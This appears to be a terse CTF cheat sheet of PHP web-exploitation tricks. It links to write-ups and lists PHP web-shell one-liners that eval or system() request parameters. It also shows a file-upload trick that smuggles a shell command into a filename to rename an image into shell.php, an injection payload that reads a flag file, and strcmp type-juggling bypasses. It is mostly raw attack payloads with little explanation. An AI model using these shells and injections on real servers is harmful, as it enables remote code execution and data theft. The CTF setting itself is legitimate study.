# +

- https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/web/owlur
- https://www.arneswinnen.net/2013/11/hack-lu-2013-ctf-wannabe-writeup-part-one-web-exploitation/
- http://php.net/manual/en/wrappers.php

```html
<script language=PHP>eval($_GET['q']);</script>
<?php print_r(scandir('/')) ?>
```

```html
<?php echo system($_GET['s']); ?>
```
    > uploaded as shell.png, then uploaded another file: ´cd uploads;cd 6a9btoq20khkn8ln5lfhuo6v62;cp 65-shell.png shell.php´.png

```
flag','..')+or+system('cat+templates/flag.php');//
```

# type juggling, weak comparison, magic hashes

```php
<?php
strcmp($_GET['user'], "admin") == 0
// => "admin1"

strcasecmp($_GET['secret'], "0x1337") == 0
// => ["1"]
```

# jail

[GitHub \- splitline/PHPFuck: PHPFuck: \(\(\+\.^\)\) / Using only 7 different characters to write and execute php\.](https://github.com/splitline/PHPFuck)
https://github.com/terjanq/Flag-Capture/blob/master/MeePwn%202018/omega/README.md#part2
https://gist.github.com/terjanq/aa39a5a40b8d9b8a8e2a54e747715a2c
    https://twitter.com/terjanq/status/1257276298550001664
